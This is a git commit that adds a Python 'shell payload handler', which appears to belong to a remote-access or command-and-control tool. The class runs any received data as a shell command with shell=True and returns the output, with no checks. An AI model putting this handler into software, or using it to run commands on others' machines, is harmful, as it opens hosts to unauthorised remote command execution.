6839147aab00a33d45608815c5ce74c4d581aa61
jack ogina <jackogina60@gmail.com>
2018-11-24 20:06:47 +0300

    shell handler
    enables shell commands execution via subprocess lib

---
+++ payloads/shell_payload_handler.py
@@ -0,0 +1,13 @@
+import subprocess
+from payloads.absract_payload_handler import AbstractPayloadHandler
+
+class ShellPayloadHandler(AbstractPayloadHandler):
+    def execute_payload(self, data:bytes) ->str:
+        try:
+            cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,
+                                    stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            output_bytes = cmd.stdout.read() + cmd.stderr.read()
+            return output_bytes.decode("utf-8", errors="replace")
+        except Exception as e:
+            return "Command execution unsuccessful: %s\n" %str(e)
+
